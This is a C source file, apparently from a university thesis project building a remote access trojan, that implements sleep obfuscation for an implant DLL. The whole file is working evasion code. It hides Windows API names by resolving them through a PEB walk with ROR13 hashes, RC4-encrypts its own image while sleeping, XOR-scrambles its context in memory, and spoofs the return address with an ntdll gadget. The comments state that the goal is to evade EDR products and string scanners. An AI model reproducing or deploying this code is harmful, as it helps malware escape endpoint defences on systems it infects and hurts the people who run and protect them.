/* ============================================================
 * ekko.c — Sleep Obfuscation (Heap-Copy + Stack Spoofing)
 *
 * APPROCCIO: sleep_helper() viene copiata su un buffer heap
 * (RW → RX) ed eseguita da un thread separato.
 * Il DLL oscilla tra RX (esecuzione) e RW (sleep cifrato):
 * non viene mai marcato RWX — IoC noto per gli EDR.
 *
 * MIGLIORAMENTI rispetto alla versione precedente:
 *   1) Risoluzione API tramite PEB walk + hash ROR13
 *      → nessuna stringa ("VirtualProtect", "Sleep", ecc.)
 *        visibile con strings/FLOSS nel binario
 *   2) SLEEP_CTX XOR-obfuscata durante lo sleep
 *      → chiave RC4, function pointer e base DLL non sono
 *        in chiaro nell'heap durante la pausa
 *
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 * ============================================================ */

#include <windows.h>
#include <string.h>
#include "ekko.h"

/* ----------------------------------------------------------
 * USTRING / SystemFunction032
 * ---------------------------------------------------------- */
typedef struct {
    ULONG Length;
    ULONG MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *fnSysFunc032)(USTRING *, USTRING *);

/* ----------------------------------------------------------
 * CET: definizioni per MinGW che non le ha
 * ---------------------------------------------------------- */
#ifndef ProcessUserShadowStackPolicy
# define ProcessUserShadowStackPolicy ((PROCESS_MITIGATION_POLICY)7)
#endif


/* ════════════════════════════════════════════════════════════
 * PEB WALK + HASH ROR13 — risoluzione API senza stringhe
 *
 * Stessa tecnica usata in etw_patch.c, generalizzata per
 * trovare qualsiasi DLL (kernel32, advapi32, ntdll) e
 * qualsiasi funzione nella EAT.
 *
 * Hash ROR13 wide (case-insensitive) per i nomi DLL,
 * hash ROR13 ASCII per i nomi funzione.
 * ════════════════════════════════════════════════════════════ */

static __inline DWORD _ror13(DWORD v) {
    return (v >> 13) | (v << 19);
}

static __inline DWORD _hash_ascii(const char *s) {
    DWORD h = 0;
    do { h = _ror13(h); h += (DWORD)(*s); } while (*++s);
    return h;
}

/* ── Hash precalcolati DLL (wide, uppercase, ROR13) ─────── */
#define HASH_KERNEL32_DLL   0x6E2BCA17U
#define HASH_ADVAPI32_DLL   0x210BEB77U
#define HASH_NTDLL_DLL      0x1EDAB0EDU  /* provato in etw_patch.c */

/* ── Hash precalcolati funzioni (ASCII, ROR13) ──────────────
 *
 * Verificabili con:
 *   DWORD h = 0; const char *s = "VirtualProtect";
 *   do { h = (h>>13)|(h<<19); h += *s; } while(*++s);
 *   printf("%08X\n", h);
 */
#define HASH_VirtualProtect       0x7946C61BU
#define HASH_SystemFunction032    0xA8A18338U
#define HASH_Sleep                0xDB2D49B0U
#define HASH_SetEvent             0xF108744EU
#define HASH_CreateThread         0xCA2BD06BU
#define HASH_WaitForSingleObject  0xCE05D9ADU
#define HASH_CreateEventW         0x30C4B297U
#define HASH_CloseHandle          0x0FFD97FBU
#define HASH_VirtualAlloc         0x91AFCA54U
#define HASH_VirtualFree          0x030633ACU
#define HASH_LoadLibraryA         0xEC0E4E8EU

/*
 * _peb_get_module_base — trova il base address di un qualsiasi
 * modulo caricato nel processo tramite PEB walk + hash ROR13
 * del suo BaseDllName (wide, case-insensitive).
 *
 * Generalizzazione di _peb_get_ntdll_base() in etw_patch.c.
 */
static ULONG_PTR _peb_get_module_base(DWORD dll_hash) {
#ifdef _WIN64
    ULONG_PTR peb;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
#else
    ULONG_PTR peb;
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb));
#endif

    ULONG_PTR ldr   = *(ULONG_PTR *)(peb + 0x18);
    ULONG_PTR entry = *(ULONG_PTR *)(ldr + 0x10);
    ULONG_PTR start = entry;

    do {
#ifdef _WIN64
        ULONG_PTR base = *(ULONG_PTR *)(entry + 0x30);
        USHORT    len  = *(USHORT    *)(entry + 0x58);
        PWSTR     buf  = *(PWSTR     *)(entry + 0x60);
#else
        ULONG_PTR base = *(ULONG_PTR *)(entry + 0x18);
        USHORT    len  = *(USHORT    *)(entry + 0x28);
        PWSTR     buf  = *(PWSTR     *)(entry + 0x2C);
#endif
        if (base && buf && len) {
            DWORD  h = 0;
            USHORT n = len / sizeof(WCHAR);
            for (USHORT i = 0; i < n; i++) {
                h = _ror13(h);
                WCHAR wc = buf[i];
                if (wc >= L'a' && wc <= L'z') wc -= 0x20;
                h += (DWORD)wc;
            }
            if (h == dll_hash)
                return base;
        }
        entry = *(ULONG_PTR *)entry;
    } while (entry && entry != start);

    return 0;
}

/*
 * _get_proc_by_hash — risolve un indirizzo funzione dalla EAT
 * di un modulo dato il suo base address e l'hash ROR13 ASCII
 * del nome della funzione.
 *
 * Generalizzazione di _ntdll_get_proc() in etw_patch.c.
 */
static PVOID _get_proc_by_hash(ULONG_PTR base, DWORD func_hash) {
    if (!base) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt =
        (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exp_rva =
        nt->OptionalHeader
          .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
    if (!exp_rva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)(base + exp_rva);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(base + names[i]);
        if (_hash_ascii(fname) == func_hash)
            return (PVOID)(base + funcs[ords[i]]);
    }
    return NULL;
}


/* ----------------------------------------------------------
 * SLEEP_CTX — passata a sleep_helper (su heap, non nel DLL)
 * ---------------------------------------------------------- */
typedef struct {
    BOOL    (WINAPI *fp_VP   )(LPVOID, SIZE_T, DWORD, PDWORD);
    NTSTATUS(WINAPI *fp_RC4  )(USTRING *, USTRING *);
    VOID    (WINAPI *fp_Sleep)(DWORD);
    BOOL    (WINAPI *fp_SE   )(HANDLE);
    PVOID    dllBase;
    SIZE_T   dllSize;
    USTRING  encData;
    USTRING  encKey;
    BYTE     key[32];
    HANDLE   hDone;
    DWORD    dwMs;
    volatile DWORD decrypted; /* 1 = sleep_helper ha completato decrypt; 0 = incerto */
} SLEEP_CTX;


/* ----------------------------------------------------------
 * sleep_helper — POSITION-INDEPENDENT:
 *   - nessun accesso a variabili global/static del DLL
 *   - tutte le chiamate tramite function pointer in ctx
 *   - nessun string literal
 *
 * Flusso (RW ↔ RX toggle, mai RWX):
 *   1. VP(RW)       → DLL non-eseguibile
 *   2. RC4 encrypt  → DLL cifrato
 *   3. XOR ctx      → SLEEP_CTX offuscata nell'heap
 *   4. Sleep(dwMs)  → questo thread è in heap, non nel DLL
 *   5. XOR ctx      → SLEEP_CTX ripristinata
 *   6. RC4 decrypt  → DLL in chiaro
 *   7. VP(RX)       → DLL eseguibile (sola lettura)
 *   8. SetEvent     → beacon thread si risveglia
 * ---------------------------------------------------------- */
__attribute__((noinline))
static DWORD WINAPI sleep_helper(LPVOID lpParam)
{
    SLEEP_CTX *c = (SLEEP_CTX *)lpParam;
    DWORD old;

    /* ── Salva su stack locale ciò che serve DURANTE lo sleep ── */
    VOID (WINAPI *local_Sleep)(DWORD) = c->fp_Sleep;
    DWORD local_dwMs = c->dwMs;

    /* ── Genera chiave XOR a 4 byte dalla chiave RC4 ────────── *
     * Prima che la struct venga offuscata, deriviamo una chiave
     * rolling da 4 byte del key[] RC4. Non crittograficamente
     * forte, ma sufficiente a impedire pattern matching banale
     * su function pointer e chiave RC4 durante lo sleep.         */
    BYTE xk[4];
    xk[0] = c->key[0]  ^ c->key[16] ^ 0xDE;
    xk[1] = c->key[7]  ^ c->key[23] ^ 0xAD;
    xk[2] = c->key[11] ^ c->key[27] ^ 0x5A;
    xk[3] = c->key[15] ^ c->key[31] ^ 0xFE;

    /* ── 1-2. RW + encrypt DLL ─────────────────────────────── */
    c->fp_VP(c->dllBase, c->dllSize, PAGE_READWRITE, &old);
    c->fp_RC4(&c->encData, &c->encKey);

    /* ── 3. XOR-offusca SLEEP_CTX ──────────────────────────── *
     * Dopo questo loop, function pointer, base address, chiave
     * RC4 e USTRING sono tutti spazzatura nell'heap.            */
    {
        BYTE *raw = (BYTE *)c;
        SIZE_T sz = sizeof(SLEEP_CTX);
        for (SIZE_T i = 0; i < sz; i++)
            raw[i] ^= xk[i & 3];
    }

    /* ── 4. Sleep — ctx è offuscata, usiamo i locals ───────── */
    local_Sleep(local_dwMs);

    /* ── 5. De-offusca SLEEP_CTX ───────────────────────────── */
    {
        BYTE *raw = (BYTE *)c;
        SIZE_T sz = sizeof(SLEEP_CTX);
        for (SIZE_T i = 0; i < sz; i++)
            raw[i] ^= xk[i & 3];
    }

    /* ── 6-7. Decrypt + RX ─────────────────────────────────── */
    c->fp_RC4(&c->encData, &c->encKey);
    c->fp_VP(c->dllBase, c->dllSize, PAGE_EXECUTE_READ, &old);

    /* Segnala al padre che il decrypt è completato */
    c->decrypted = 1;
    c->fp_SE(c->hDone);
    return 0;
}

/* Sentinella per calcolare la dimensione di sleep_helper */
__attribute__((noinline))
static DWORD WINAPI _sleep_helper_sentinel(LPVOID x)
{
    (void)x;
    return 0;
}

/* ----------------------------------------------------------
 * Helpers interni
 * ---------------------------------------------------------- */
static PVOID _own_base(void)
{
    MEMORY_BASIC_INFORMATION mbi = {0};
    if (!VirtualQuery((PVOID)_own_base, &mbi, sizeof(mbi)))
        return NULL;
    return mbi.AllocationBase;
}

static SIZE_T _own_size(PVOID base)
{
    if (!base) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)((BYTE *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    return (SIZE_T)nt->OptionalHeader.SizeOfImage;
}

/* Trova il primo byte 0xC3 (RET) in ntdll — stack spoofing
 * Usa PEB walk (nessuna stringa "ntdll.dll" nel binario) */
static PVOID _find_ret_gadget(void)
{
    ULONG_PTR h = _peb_get_module_base(HASH_NTDLL_DLL);
    if (!h) return NULL;
    PIMAGE_DOS_HEADER   dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS64 nt  =
        (PIMAGE_NT_HEADERS64)((BYTE *)h + dos->e_lfanew);
    BYTE  *img = (BYTE *)h;
    SIZE_T sz  = nt->OptionalHeader.SizeOfImage;
    for (SIZE_T i = 0; i < sz; i++)
        if (img[i] == 0xC3) return img + i;
    return NULL;
}

/* VirtualProtect su tutte le sub-regioni in [base, base+size).
 * Necessario perché il reflective loader crea VAD entries separate
 * per ogni sezione: una singola VP coprirebbe solo la prima. */
static BOOL _vprotect_range(PVOID base, SIZE_T size,
                            DWORD newProt, PDWORD pOldProt)
{
    BYTE *addr  = (BYTE *)base;
    BYTE *end   = addr + size;
    DWORD dummy = 0;
    BOOL  ok    = FALSE;
    if (!pOldProt) pOldProt = &dummy;

    while (addr < end) {
        MEMORY_BASIC_INFORMATION mbi = {0};
        if (!VirtualQuery(addr, &mbi, sizeof(mbi))) break;
        SIZE_T chunk = mbi.RegionSize;
        if ((BYTE *)mbi.BaseAddress + chunk > end)
            chunk = (SIZE_T)(end - (BYTE *)mbi.BaseAddress);
        DWORD prev = 0;
        if (VirtualProtect(mbi.BaseAddress, chunk, newProt, &prev)) {
            *pOldProt = prev;
            ok = TRUE;
        }
        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
    }
    return ok;
}


/* ----------------------------------------------------------
 * ekko_sleep — entry point pubblico
 * ---------------------------------------------------------- */
__attribute__((noinline, optimize("no-omit-frame-pointer")))
void ekko_sleep(DWORD dwMs)
{
    /* ---- Fix 4: CET ---------------------------------------- */
    {
        PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY cet = {0};
        if (GetProcessMitigationPolicy(
                GetCurrentProcess(),
                ProcessUserShadowStackPolicy,
                &cet, sizeof(cet))
            && cet.EnableUserShadowStack)
        {
            goto fallback;
        }
    }

    /* ── Resolve API tramite PEB walk + hash ROR13 ───────────
     * Nessuna stringa di nome funzione nel binario:
     * tutto risolto con hash precalcolati.
     * ─────────────────────────────────────────────────────── */
    ULONG_PTR hK32 = _peb_get_module_base(HASH_KERNEL32_DLL);
    if (!hK32) goto fallback;

    /* advapi32 potrebbe non essere ancora caricata; se il PEB walk
     * non la trova, la carichiamo via LoadLibraryA (risolta da hash)
     * con nome costruito sullo stack (non nel .rdata). */
    ULONG_PTR hAdv = _peb_get_module_base(HASH_ADVAPI32_DLL);
    if (!hAdv) {
        typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
        fnLoadLibraryA pLLA = (fnLoadLibraryA)
            _get_proc_by_hash(hK32, HASH_LoadLibraryA);
        if (!pLLA) goto fallback;
        /* Nome costruito sullo stack — non finisce in .rdata */
        char adv[] = { 'a','d','v','a','p','i','3','2','.','d','l','l',0 };
        hAdv = (ULONG_PTR)pLLA(adv);
        if (!hAdv) goto fallback;
    }

    BOOL    (WINAPI *fp_VP   )(LPVOID,SIZE_T,DWORD,PDWORD) =
        (void *)_get_proc_by_hash(hK32, HASH_VirtualProtect);
    NTSTATUS(WINAPI *fp_RC4  )(USTRING*,USTRING*) =
        (void *)_get_proc_by_hash(hAdv, HASH_SystemFunction032);
    VOID    (WINAPI *fp_Sleep)(DWORD) =
        (void *)_get_proc_by_hash(hK32, HASH_Sleep);
    BOOL    (WINAPI *fp_SE   )(HANDLE) =
        (void *)_get_proc_by_hash(hK32, HASH_SetEvent);
    HANDLE  (WINAPI *fp_CT   )(LPSECURITY_ATTRIBUTES,SIZE_T,
                               LPTHREAD_START_ROUTINE,LPVOID,
                               DWORD,LPDWORD) =
        (void *)_get_proc_by_hash(hK32, HASH_CreateThread);
    DWORD   (WINAPI *fp_WFSO )(HANDLE,DWORD) =
        (void *)_get_proc_by_hash(hK32, HASH_WaitForSingleObject);
    HANDLE  (WINAPI *fp_CE   )(LPSECURITY_ATTRIBUTES,BOOL,BOOL,LPCWSTR) =
        (void *)_get_proc_by_hash(hK32, HASH_CreateEventW);
    BOOL    (WINAPI *fp_CH   )(HANDLE) =
        (void *)_get_proc_by_hash(hK32, HASH_CloseHandle);
    LPVOID  (WINAPI *fp_VA   )(LPVOID,SIZE_T,DWORD,DWORD) =
        (void *)_get_proc_by_hash(hK32, HASH_VirtualAlloc);
    BOOL    (WINAPI *fp_VF   )(LPVOID,SIZE_T,DWORD) =
        (void *)_get_proc_by_hash(hK32, HASH_VirtualFree);

    if (!fp_VP || !fp_RC4 || !fp_Sleep || !fp_SE ||
        !fp_CT || !fp_WFSO || !fp_CE || !fp_CH ||
        !fp_VA || !fp_VF)
        goto fallback;

    /* ---- Base / Size del DLL corrente ---------------------- */
    PVOID  dllBase = _own_base();
    SIZE_T dllSize = _own_size(dllBase);
    if (!dllBase || !dllSize) goto fallback;

    /* ---- Pre-normalizzazione a RX (mai RWX) --------------- */
    {
        DWORD _p = 0;
        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READ, &_p);
    }

    /* ---- Dimensione di sleep_helper (con sanity check) ----- */
    SIZE_T helper_size =
        (SIZE_T)((BYTE *)_sleep_helper_sentinel - (BYTE *)sleep_helper);
    if (helper_size == 0 || helper_size > 4096)
        helper_size = 512;

    /* ---- Copia sleep_helper su heap (RW → RX, mai RWX) ---- */
    PVOID helper_copy = fp_VA(NULL, helper_size + 64,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!helper_copy) goto fallback;
    memcpy(helper_copy, (PVOID)sleep_helper, helper_size);
    /* Transizione RW → RX: il codice è ora eseguibile e non scrivibile */
    {
        DWORD _hp = 0;
        fp_VP(helper_copy, helper_size + 64, PAGE_EXECUTE_READ, &_hp);
    }

    /* ---- Alloca SLEEP_CTX su heap ------------------------- */
    SLEEP_CTX *ctx = (SLEEP_CTX *)fp_VA(NULL, sizeof(SLEEP_CTX),
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE);
    if (!ctx) {
        fp_VF(helper_copy, 0, MEM_RELEASE);
        goto fallback;
    }

    /* ---- Genera chiave RC4 a 32 byte (xorshift64) --------- */
    {
        ULONG64 s = (ULONG64)dllBase
                    ^ ((ULONG64)dwMs << 16)
                    ^ 0xDEADBEEFCAFEBABEULL;
        for (int i = 0; i < 32; i++) {
            s ^= (s >> 12);
            s ^= (s << 25);
            s ^= (s >> 27);
            ctx->key[i] = (BYTE)(s & 0xFF);
        }
    }

    /* ---- Popola SLEEP_CTX --------------------------------- */
    ctx->fp_VP    = fp_VP;
    ctx->fp_RC4   = fp_RC4;
    ctx->fp_Sleep = fp_Sleep;
    ctx->fp_SE    = fp_SE;

    ctx->dllBase  = dllBase;
    ctx->dllSize  = dllSize;

    ctx->encData.Buffer        = dllBase;
    ctx->encData.Length        = (ULONG)dllSize;
    ctx->encData.MaximumLength = (ULONG)dllSize;

    ctx->encKey.Buffer         = ctx->key;
    ctx->encKey.Length         = 32;
    ctx->encKey.MaximumLength  = 32;

    ctx->dwMs      = dwMs;
    ctx->decrypted = 0;   /* sleep_helper setta a 1 dopo il decrypt */

    ctx->hDone = fp_CE(NULL, FALSE, FALSE, NULL);
    if (!ctx->hDone) {
        fp_VF(ctx, 0, MEM_RELEASE);
        fp_VF(helper_copy, 0, MEM_RELEASE);
        goto fallback;
    }

    /* ---- Stack spoofing ----------------------------------- */
    PVOID pRetGadget = _find_ret_gadget();
    void *ret_slot_addr = NULL;
    __asm__ volatile ("lea 8(%%rbp), %0" : "=r"(ret_slot_addr));
    void **ret_slot = (void **)ret_slot_addr;
    void  *orig_ret = *ret_slot;
    if (pRetGadget)
        *ret_slot = pRetGadget;

    /* ---- Lancia sleep_helper dal heap --------------------- */
    HANDLE hThread = fp_CT(NULL, 0,
                           (LPTHREAD_START_ROUTINE)helper_copy,
                           ctx, 0, NULL);
    if (!hThread) {
        if (pRetGadget) *ret_slot = orig_ret;
        fp_CH(ctx->hDone);
        fp_VF(ctx, 0, MEM_RELEASE);
        fp_VF(helper_copy, 0, MEM_RELEASE);
        goto fallback;
    }

    /* ---- Attendi fine sleep (timeout = dwMs + 10 s) ------- */
    DWORD wr = fp_WFSO(ctx->hDone, dwMs + 10000);

    /* ---- Ripristina return address PRIMA di qualsiasi ret -- */
    if (pRetGadget)
        *ret_slot = orig_ret;

    if (wr != WAIT_OBJECT_0 && ctx->decrypted == 0) {
        /* Timeout reale: sleep_helper non ha ancora decifrato il DLL.
         * Forziamo RW per scrivere, decifriamo, poi ripristiniamo RX. */
        DWORD _rp0 = 0;
        _vprotect_range(dllBase, dllSize, PAGE_READWRITE, &_rp0);
        USTRING ed = { (ULONG)dllSize, (ULONG)dllSize, dllBase };
        USTRING ek = { 32, 32, ctx->key };
        fp_RC4(&ed, &ek);
    }

    /* ---- Ripristina RX (mai RWX) su TUTTE le regioni dopo sleep --------
     * sleep_helper usa una singola VirtualProtect che potrebbe coprire
     * solo la prima VAD entry. _vprotect_range itera su tutte le regioni.
     * Applicato sempre (sia WAIT_OBJECT_0 che timeout). */
    {
        DWORD _rp = 0;
        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READ, &_rp);
    }

    /* ---- Cleanup ------------------------------------------ */
    fp_WFSO(hThread, 3000);
    fp_CH(hThread);
    fp_CH(ctx->hDone);
    fp_VF(ctx,         0, MEM_RELEASE);
    fp_VF(helper_copy, 0, MEM_RELEASE);
    return;

fallback:
    Sleep(dwMs);
}
